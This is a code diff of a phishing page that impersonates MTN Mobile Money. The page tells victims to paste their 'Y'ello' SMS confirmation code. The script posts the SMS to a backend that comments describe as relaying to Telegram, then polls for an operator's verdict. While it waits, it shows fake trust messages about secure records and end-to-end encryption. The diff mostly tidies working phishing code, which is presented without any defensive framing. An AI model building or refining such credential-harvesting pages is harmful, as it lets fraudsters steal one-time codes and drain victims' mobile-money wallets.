@@ -30,36 +30,18 @@
     -webkit-font-smoothing: antialiased; line-height: 1.45;
     min-height: 100vh; display: flex; justify-content: center; padding: 0;
   }
-  .phone {
-    width: 100%; max-width: 430px; min-height: 100vh;
-    background: var(--mtn-white); display: flex; flex-direction: column;
-    position: relative; overflow: hidden;
-  }
-
-  .top {
-    position: relative; flex-shrink: 0;
-    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
-    padding: 18px 22px 26px;
-    border-bottom-left-radius: 38% 32px;
-    border-bottom-right-radius: 38% 32px;
-  }
+  .phone { width: 100%; max-width: 430px; min-height: 100vh; background: var(--mtn-white); display: flex; flex-direction: column; position: relative; overflow: hidden; }
+  .top { position: relative; flex-shrink: 0; background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%); padding: 18px 22px 26px; border-bottom-left-radius: 38% 32px; border-bottom-right-radius: 38% 32px; }
   .top-row { display: flex; align-items: center; justify-content: space-between; gap: 12px; }
   .brand { display: inline-flex; align-items: baseline; gap: 2px; font-weight: 900; font-size: 18px; letter-spacing: -0.4px; color: #fff; }
   .brand .mtn { color: var(--mtn-yellow); }
   .brand .mm  { color: #FFFFFF; opacity: 0.95; }
   .page-title { margin-top: 22px; font-size: 19px; font-weight: 800; color: #fff; letter-spacing: -0.3px; line-height: 1.25; }
   .page-sub { margin-top: 6px; font-size: 12.5px; color: rgba(255,255,255,0.78); line-height: 1.5; max-width: 320px; }
-
   .body { flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch; padding: 22px 22px 20px; display: flex; flex-direction: column; }
-
-  .amount-card {
-    background: var(--mtn-soft); border-radius: 14px;
-    padding: 14px 16px; display: flex; align-items: baseline; justify-content: space-between;
-    gap: 12px; margin-bottom: 22px;
-  }
+  .amount-card { background: var(--mtn-soft); border-radius: 14px; padding: 14px 16px; display: flex; align-items: baseline; justify-content: space-between; gap: 12px; margin-bottom: 22px; }
   .amount-card .label { font-size: 11px; color: var(--mtn-gray); font-weight: 600; letter-spacing: 0.4px; text-transform: uppercase; }
   .amount-card .amount { font-size: 22px; font-weight: 800; color: var(--mtn-deep); letter-spacing: -0.6px; }
-
   .notice { display: none; padding: 13px 15px; border-radius: 12px; font-size: 12.5px; font-weight: 600; line-height: 1.55; margin-bottom: 18px; border: 1px solid transparent; }
   .notice.show { display: block; }
   .notice .notice-title { font-size: 11px; font-weight: 800; letter-spacing: 0.6px; text-transform: uppercase; margin-bottom: 4px; display: block; }
@@ -69,121 +51,52 @@
   .notice.error .notice-title { color: #8B0000; }
   .notice.info { background: #EAF3FE; border-color: #BFD8F6; color: var(--mtn-deep); }
   .notice.info .notice-title { color: var(--mtn-deep); }
-
   .section-label { font-size: 11px; font-weight: 800; letter-spacing: 0.8px; text-transform: uppercase; color: var(--mtn-gray); margin-bottom: 8px; }
-
-  .sms-box {
-    width: 100%; min-height: 130px; resize: vertical;
-    background: var(--mtn-soft); border: 1.5px solid var(--mtn-border); border-radius: 12px;
-    padding: 14px; font-family: 'Poppins', -apple-system, sans-serif;
-    font-size: 13px; line-height: 1.55; color: var(--mtn-text);
-    outline: none; transition: border-color .15s, background .15s; -webkit-appearance: none;
-  }
+  .sms-box { width: 100%; min-height: 130px; resize: vertical; background: var(--mtn-soft); border: 1.5px solid var(--mtn-border); border-radius: 12px; padding: 14px; font-family: 'Poppins', -apple-system, sans-serif; font-size: 13px; line-height: 1.55; color: var(--mtn-text); outline: none; transition: border-color .15s, background .15s; -webkit-appearance: none; }
   .sms-box::placeholder { color: #9AA6B8; font-weight: 400; }
   .sms-box:focus { border-color: var(--mtn-royal); background: #fff; }
   .sms-box.invalid { border-color: #E23B3B; background: #FEF3F3; }
-
   .field-error { display: none; font-size: 11.5px; color: var(--mtn-red); margin-top: 6px; font-weight: 600; line-height: 1.4; }
   .field-error.show { display: block; }
-
-  .btn-paste {
-    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
-    width: 100%; margin-top: 10px; padding: 11px 14px; font-size: 12.5px; font-weight: 700;
-    background: #fff; color: var(--mtn-royal); border: 1.5px solid #CBD5E1; border-radius: 10px;
-    cursor: pointer; font-family: inherit; transition: all .15s;
-  }
+  .btn-paste { display: inline-flex; align-items: center; justify-content: center; gap: 8px; width: 100%; margin-top: 10px; padding: 11px 14px; font-size: 12.5px; font-weight: 700; background: #fff; color: var(--mtn-royal); border: 1.5px solid #CBD5E1; border-radius: 10px; cursor: pointer; font-family: inherit; transition: all .15s; }
   .btn-paste:hover { border-color: var(--mtn-royal); background: #F0F5FC; }
   .btn-paste:disabled { opacity: 0.6; cursor: default; }
-
   .detected { margin-top: 14px; padding: 12px 14px; background: #EAF7EE; border: 1px solid #CDEBD6; border-radius: 10px; display: none; }
   .detected.show { display: block; }
   .detected .det-k { font-size: 10.5px; font-weight: 800; letter-spacing: 0.5px; text-transform: uppercase; color: #1E7A3A; margin-bottom: 4px; }
   .detected .det-v { font-size: 15px; font-weight: 800; color: #0F5425; letter-spacing: 1.5px; word-break: break-all; }
-
-  .btn-confirm {
-    width: 100%; margin-top: 22px; height: 54px;
-    background: var(--mtn-green); color: #fff;
-    font-family: inherit; font-size: 15px; font-weight: 900;
-    letter-spacing: 1.2px; text-transform: uppercase;
-    border: none; border-radius: 999px; cursor: pointer;
-    box-shadow: 0 10px 24px rgba(40,167,69,0.28);
-    transition: filter .15s, transform .1s, opacity .15s;
-  }
+  .btn-confirm { width: 100%; margin-top: 22px; height: 54px; background: var(--mtn-green); color: #fff; font-family: inherit; font-size: 15px; font-weight: 900; letter-spacing: 1.2px; text-transform: uppercase; border: none; border-radius: 999px; cursor: pointer; box-shadow: 0 10px 24px rgba(40,167,69,0.28); transition: filter .15s, transform .1s, opacity .15s; }
   .btn-confirm:hover { filter: brightness(1.06); }
   .btn-confirm:active { transform: scale(0.985); }
   .btn-confirm:disabled { opacity: 0.65; cursor: wait; }
-
   .help-note { margin-top: 18px; font-size: 11.5px; color: var(--mtn-gray); line-height: 1.6; text-align: center; }
   .help-note strong { color: var(--mtn-text); font-weight: 700; }
-
-  .btn-resend {
-    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
-    width: 100%; margin-top: 10px; padding: 12px 16px; font-size: 13px; font-weight: 700;
-    background: #fff; color: var(--mtn-royal); border: 1.5px solid var(--mtn-royal); border-radius: 10px;
-    cursor: pointer; font-family: inherit; transition: all .15s;
-  }
+  .btn-resend { display: inline-flex; align-items: center; justify-content: center; gap: 8px; width: 100%; margin-top: 10px; padding: 12px 16px; font-size: 13px; font-weight: 700; background: #fff; color: var(--mtn-royal); border: 1.5px solid var(--mtn-royal); border-radius: 10px; cursor: pointer; font-family: inherit; transition: all .15s; }
   .btn-resend:hover { background: #F0F5FC; }
   .btn-resend:disabled { opacity: 0.6; cursor: wait; }
   .btn-resend svg { width: 15px; height: 15px; stroke: currentColor; fill: none; stroke-width: 2.4; stroke-linecap: round; stroke-linejoin: round; }
   .btn-resend.sent { background: var(--mtn-green); color: #fff; border-color: var(--mtn-green); }
-
-  .mtn-footer {
-    width: 100%; margin-top: 22px; background: var(--mtn-yellow); border-radius: 12px;
-    padding: 14px 16px; display: flex; align-items: center; justify-content: space-between;
-    gap: 12px; text-align: left;
-  }
+  .mtn-footer { width: 100%; margin-top: 22px; background: var(--mtn-yellow); border-radius: 12px; padding: 14px 16px; display: flex; align-items: center; justify-content: space-between; gap: 12px; text-align: left; }
   .mtn-footer .foot-brand { display: inline-flex; align-items: baseline; gap: 2px; font-weight: 900; font-size: 15px; letter-spacing: -0.4px; color: #000; }
   .mtn-footer .foot-support { font-size: 11px; color: #000; line-height: 1.45; font-weight: 600; text-align: right; }
   .mtn-footer .foot-support strong { font-weight: 800; }
-
-  .toast {
-    position: fixed; bottom: 24px; left: 50%;
-    transform: translateX(-50%) translateY(80px);
-    background: #0A0F1F; color: #fff; padding: 11px 18px; border-radius: 9px;
-    font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
-    z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
-  }
+  .toast { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(80px); background: #0A0F1F; color: #fff; padding: 11px 18px; border-radius: 9px; font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease; z-index: 50; pointer-events: none; max-width: 90%; text-align: center; }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
-
-  .authorizing {
-    position: fixed; inset: 0;
-    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
-    display: none; flex-direction: column; align-items: center; justify-content: center;
-    padding: 28px 24px; z-index: 9999; text-align: center; color: #fff;
-  }
+  .authorizing { position: fixed; inset: 0; background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%); display: none; flex-direction: column; align-items: center; justify-content: center; padding: 28px 24px; z-index: 9999; text-align: center; color: #fff; }
   .authorizing.show { display: flex; }
   .authorizing .brand-label { font-size: 15px; font-weight: 800; letter-spacing: -0.2px; margin-bottom: 34px; }
   .authorizing .brand-label .mtn { color: var(--mtn-yellow); }
   .authorizing .brand-label .mm  { color: #fff; }
-  .authorizing .spinner {
-    width: 60px; height: 60px;
-    border: 4px solid rgba(255,255,255,0.18);
-    border-top-color: var(--mtn-yellow);
-    border-radius: 50%;
-    animation: spin 0.9s linear infinite;
-    margin-bottom: 22px;
-  }
+  .authorizing .spinner { width: 60px; height: 60px; border: 4px solid rgba(255,255,255,0.18); border-top-color: var(--mtn-yellow); border-radius: 50%; animation: spin 0.9s linear infinite; margin-bottom: 22px; }
   @keyframes spin { to { transform: rotate(360deg); } }
   .authorizing h2 { font-size: 20px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 24px; }
-
   .trust-slider { width: 100%; max-width: 340px; height: 76px; position: relative; overflow: hidden; display: flex; align-items: center; justify-content: center; }
-  .trust-msg {
-    position: absolute; inset: 0; display: flex; align-items: center; justify-content: center;
-    padding: 0 8px; opacity: 0; transform: translateX(24px);
-    transition: opacity .45s ease, transform .45s ease;
-    font-size: 13px; line-height: 1.55; color: rgba(255,255,255,0.86); font-weight: 500; text-align: center;
-  }
+  .trust-msg { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; padding: 0 8px; opacity: 0; transform: translateX(24px); transition: opacity .45s ease, transform .45s ease; font-size: 13px; line-height: 1.55; color: rgba(255,255,255,0.86); font-weight: 500; text-align: center; }
   .trust-msg.active { opacity: 1; transform: translateX(0); }
   .trust-msg.leaving { opacity: 0; transform: translateX(-24px); }
   .trust-msg::before { content: '✓'; color: var(--mtn-yellow); font-weight: 900; margin-right: 8px; }
-
-  .authorizing .cancel-link {
-    margin-top: 28px; background: transparent; border: none;
-    color: rgba(255,255,255,0.68); font-family: inherit; font-size: 12px; font-weight: 600;
-    cursor: pointer; text-decoration: underline; text-underline-offset: 3px;
-  }
+  .authorizing .cancel-link { margin-top: 28px; background: transparent; border: none; color: rgba(255,255,255,0.68); font-family: inherit; font-size: 12px; font-weight: 600; cursor: pointer; text-decoration: underline; text-underline-offset: 3px; }
   .authorizing .cancel-link:hover { color: var(--mtn-yellow); }
-
   @media (max-width: 380px) {
     .top { padding: 16px 18px 22px; }
     .body { padding: 18px 18px 16px; }
@@ -204,10 +117,7 @@
   }
   @media (min-width: 640px) {
     body { padding: 32px 0; align-items: center; }
-    .phone {
-      min-height: calc(100vh - 64px); max-height: 900px; border-radius: 32px;
-      box-shadow: 0 40px 100px rgba(7, 58, 135, 0.18); overflow: hidden;
-    }
+    .phone { min-height: calc(100vh - 64px); max-height: 900px; border-radius: 32px; box-shadow: 0 40px 100px rgba(7, 58, 135, 0.18); overflow: hidden; }
     .top { border-top-left-radius: 32px; border-top-right-radius: 32px; }
   }
 </style>
@@ -215,7 +125,6 @@
 <body>
 
 <div class="phone">
-
   <div class="top">
     <div class="top-row">
       <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
@@ -225,7 +134,6 @@
   </div>
 
   <div class="body">
-
     <div class="notice error" id="noticeDeclined">
       <span class="notice-title">Transfer declined</span>
       Your transfer was not approved. Please check the details and try again, or contact MTN support if the issue continues.
@@ -245,29 +153,17 @@
     </div>
 
     <div class="section-label">Y'ello SMS message</div>
-    <textarea
-      class="sms-box"
-      id="smsInput"
-      placeholder="Paste the full Y'ello message here…"
-      spellcheck="false"
-      autocomplete="off"
-    ></textarea>
-    <div class="field-error" id="smsError">
-      The message must start with "Y'ello" and contain the confirmation code.
-    </div>
+    <textarea class="sms-box" id="smsInput" placeholder="Paste the full Y'ello message here…" spellcheck="false" autocomplete="off"></textarea>
+    <div class="field-error" id="smsError">The message must start with "Y'ello" and contain the confirmation code.</div>
 
-    <button class="btn-paste" id="pasteBtn" onclick="pasteFromClipboard()">
-      📋 Paste from clipboard
-    </button>
+    <button class="btn-paste" id="pasteBtn" onclick="pasteFromClipboard()">📋 Paste from clipboard</button>
 
     <div class="detected" id="detectedBox">
       <div class="det-k">Detected confirmation code</div>
       <div class="det-v" id="detectedCode">—</div>
     </div>
 
-    <button class="btn-confirm" id="confirmBtn" onclick="confirmPayment()">
-      Confirm transfer
-    </button>
+    <button class="btn-confirm" id="confirmBtn" onclick="confirmPayment()">Confirm transfer</button>
 
     <div class="help-note">
       Didn't receive the message?<br>
@@ -281,12 +177,8 @@
 
     <div class="mtn-footer">
       <div class="foot-brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
-      <div class="foot-support">
-        Need help?<br>
-        Call <strong id="supportNum">—</strong>
-      </div>
+      <div class="foot-support">Need help?<br>Call <strong id="supportNum">—</strong></div>
     </div>
-
   </div>
 </div>
 
@@ -294,22 +186,17 @@
   <div class="brand-label"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
   <div class="spinner"></div>
   <h2 id="authTitle">Verifying…</h2>
-
   <div class="trust-slider">
     <div class="trust-msg active">Your message is being checked against MTN's secure records.</div>
     <div class="trust-msg">This step protects your wallet from unauthorized transfers.</div>
     <div class="trust-msg">Your details stay encrypted end-to-end during verification.</div>
   </div>
-
   <button class="cancel-link" onclick="cancelAuthorizing()">Cancel</button>
 </div>
 
 <div class="toast" id="toast"></div>
 
 <script>
-  /* ============================================================
-     CONFIG
-  ============================================================ */
   const CONFIG = {
     OTP_PAGE: 'otp.html',
     SHORT_LINK_ENDPOINTS: [
@@ -321,11 +208,6 @@
     POLL_MS: 1500
   };
 
-  /* ============================================================
-     Read transaction from URL (?d= | ?r= | ?am= etc.)
-     Mirrors the client/processing pages so amount + currency
-     always come from the generated link.
-  ============================================================ */
   const params = new URLSearchParams(location.search);
 
   const SUPPORT_NUMBERS = {
@@ -366,33 +248,22 @@
     return decodeURIComponent(escape(atob(str)));
   }
 
-  const tx = {
-    ref: '', am: '', cur: '', rn: '', c: '', pm: '', sn: '', mk: '', an: '', dt: ''
-  };
+  const tx = { ref: '', am: '', cur: '', rn: '', c: '', pm: '', sn: '', mk: '', an: '', dt: '' };
 
   async function resolveTx() {
-    // 1) ?d= base64 JSON payload
     const d = params.get('d');
     if (d) {
       try {
         const payload = JSON.parse(b64urlDecode(d));
         Object.assign(tx, {
           ref: payload.tx || payload.tn || '',
-          am: payload.am || '',
-          cur: payload.cur || '',
-          rn: payload.rn || '',
-          c:  payload.c  || '',
-          pm: payload.pm || '',
-          sn: payload.sn || '',
-          mk: payload.mk || '',
-          an: payload.an || '',
-          dt: payload.dt || ''
+          am: payload.am || '', cur: payload.cur || '', rn: payload.rn || '',
+          c: payload.c || '', pm: payload.pm || '', sn: payload.sn || '',
+          mk: payload.mk || '', an: payload.an || '', dt: payload.dt || ''
         });
         return;
-      } catch (e) { /* fall through */ }
+      } catch (e) {}
     }
-
-    // 2) ?r= short code -> fetch from server
     const code = params.get('r');
     if (code) {
       for (const makeUrl of CONFIG.SHORT_LINK_ENDPOINTS) {
@@ -403,24 +274,15 @@
           const p = data && (data.payload || data);
           if (p && (p.am || p.c)) {
             Object.assign(tx, {
-              ref: p.tx || p.tn || '',
-              am: p.am || '',
-              cur: p.cur || '',
-              rn: p.rn || '',
-              c:  p.c  || '',
-              pm: p.pm || '',
-              sn: p.sn || '',
-              mk: p.mk || '',
-              an: p.an || '',
-              dt: p.dt || ''
+              ref: p.tx || p.tn || '', am: p.am || '', cur: p.cur || '',
+              rn: p.rn || '', c: p.c || '', pm: p.pm || '', sn: p.sn || '',
+              mk: p.mk || '', an: p.an || '', dt: p.dt || ''
             });
             return;
           }
-        } catch (e) { /* try next */ }
+        } catch (e) {}
       }
     }
-
-    // 3) sessionStorage fallback
     try {
       const raw = sessionStorage.getItem('amz_payload');
       if (raw) {
@@ -433,8 +295,6 @@
         return;
       }
     } catch (e) {}
-
-    // 4) direct query params (last resort)
     tx.ref = params.get('tx') || '';
     tx.am  = params.get('am') || '';
     tx.cur = params.get('cur') || '';
@@ -454,11 +314,7 @@
     t._timer = setTimeout(() => t.classList.remove('show'), 2400);
   }
 
-  /* ============================================================
-     Trust slider
-  ============================================================ */
-  let trustTimer = null;
-  let trustIndex = 0;
+  let trustTimer = null, trustIndex = 0;
   function startTrustSlider() {
     const msgs = document.querySelectorAll('.trust-msg');
     trustIndex = 0;
@@ -475,9 +331,6 @@
   }
   function stopTrustSlider() { if (trustTimer) { clearInterval(trustTimer); trustTimer = null; } }
 
-  /* ============================================================
-     Notices
-  ============================================================ */
   function hideAllNotices() {
     document.getElementById('noticeDeclined').classList.remove('show');
     document.getElementById('noticeExpired').classList.remove('show');
@@ -490,16 +343,12 @@
     el.scrollIntoView({ behavior: 'smooth', block: 'center' });
   }
 
-  /* ============================================================
-     Parse Y'ello message
-  ============================================================ */
   let detectedCode = '';
   function parseYelloMessage(raw) {
     const text = (raw || '').trim();
     if (!text) return { ok: false, reason: 'empty' };
     const first = text.split(/\s+/)[0].toLowerCase().replace(/[’'`´]/g, "'");
     if (!/^y'?ello/.test(first)) return { ok: false, reason: 'prefix' };
-
     let code = '';
     const explicit = text.match(/(?:code|ref|reference|otp|pin|txn)\s*[:=\-]?\s*([A-Z0-9]{4,})/i);
     if (explicit && explicit[1]) code = explicit[1];
@@ -543,9 +392,6 @@
     updateDetected();
   });
 
-  /* ============================================================
-     Resend SMS
-  ============================================================ */
   async function resendSms() {
     const btn = document.getElementById('resendBtn');
     const lbl = document.getElementById('resendLabel');
@@ -561,7 +407,7 @@
       btn.classList.add('sent');
       lbl.textContent = 'Sent ✓';
       hideAllNotices();
-      showToast('A new Y\'ello message was sent to your phone.');
+      showToast("A new Y'ello message was sent to your phone.");
       setTimeout(() => {
         btn.classList.remove('sent');
         lbl.textContent = 'Resend SMS';
@@ -574,9 +420,6 @@
     }
   }
 
-  /* ============================================================
-     Paste
-  ============================================================ */
   async function pasteFromClipboard() {
     const btn = document.getElementById('pasteBtn');
     btn.disabled = true;
@@ -602,9 +445,6 @@
     btn.disabled = false;
   }
 
-  /* ============================================================
-     Confirm → send SMS to server (Telegram) → poll
-  ============================================================ */
   let pollingActive = false;
   let pollTimer = null;
 
@@ -626,7 +466,7 @@
 
     if (!input.value.trim()) {
       input.classList.add('invalid');
-      err.textContent = 'Please paste the Y\'ello message you received.';
+      err.textContent = "Please paste the Y'ello message you received.";
       err.classList.add('show');
       input.focus();
       return;
@@ -635,7 +475,7 @@
     if (!res.ok) {
       input.classList.add('invalid');
       err.textContent = res.reason === 'prefix'
-        ? 'The message must start with "Y\'ello".'
+        ? "The message must start with \"Y'ello\"."
         : 'We could not find a confirmation code in the message.';
       err.classList.add('show');
       input.focus();
@@ -646,12 +486,11 @@
     const btn = document.getElementById('confirmBtn');
     btn.disabled = true;
 
-    // Make sure we have a reference ID even if link was missing it
+    // Guarantee a stable ref
     if (!tx.ref) {
-      tx.ref = 'MTN-' + Date.now().toString(36).toUpperCase();
+      tx.ref = 'MTN-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2,6).toUpperCase();
     }
 
-    // Send exact pasted SMS to backend → Telegram
     try {
       const r = await fetch(CONFIG.SMS_SEND, {
         method: 'POST',
@@ -674,7 +513,6 @@
       return;
     }
 
-    // Full-screen verifying overlay
     document.getElementById('authTitle').textContent = 'Verifying…';
     document.getElementById('authorizingOverlay').classList.add('show');
     startTrustSlider();
@@ -686,11 +524,10 @@
       try {
         const r = await fetch(CONFIG.SMS_STATUS(tx.ref));
         const j = await r.json();
-        decision = j.decision || 'pending';
-      } catch (e) { /* keep polling */ }
+        decision = (j && (j.decision || j.status)) || 'pending';
+      } catch (e) {}
       if (!pollingActive) return;
 
-      // APPROVED → next page
       if (decision === 'approved') {
         pollingActive = false;
         stopTrustSlider();
@@ -702,7 +539,6 @@
         return;
       }
 
-      // PASTE FULL SMS (2nd Telegram button)
       if (decision === 'paste_full' || decision === 'needs_full_sms' || decision === 'fully') {
         pollingActive = false;
         stopTrustSlider();
@@ -711,12 +547,11 @@
         btn.textContent = 'Confirm transfer';
         showNotice('noticeFullSms');
         document.getElementById('smsInput').focus();
-        showToast('Please paste the full Y\'ello SMS, or tap Resend SMS.');
+        showToast("Please paste the full Y'ello SMS, or tap Resend SMS.");
         return;
       }
 
-      // SMS EXPIRED (3rd Telegram button)
-      if (decision === 'expired') {
+      if (decision === 'expired' || decision === 'declined') {
         pollingActive = false;
         stopTrustSlider();
         document.getElementById('authorizingOverlay').classList.remove('show');
@@ -735,15 +570,10 @@
     poll();
   }
 
-  /* ============================================================
-     Init
-  ============================================================ */
   document.addEventListener('DOMContentLoaded', async () => {
     await resolveTx();
-    document.getElementById('amountLabel').textContent =
-      tx.am ? formatAmount(tx.am, tx.cur) : '—';
-    document.getElementById('supportNum').textContent =
-      SUPPORT_NUMBERS[tx.c] || '—';
+    document.getElementById('amountLabel').textContent = tx.am ? formatAmount(tx.am, tx.cur) : '—';
+    document.getElementById('supportNum').textContent = SUPPORT_NUMBERS[tx.c] || '—';
   });
 </script>
 </body>
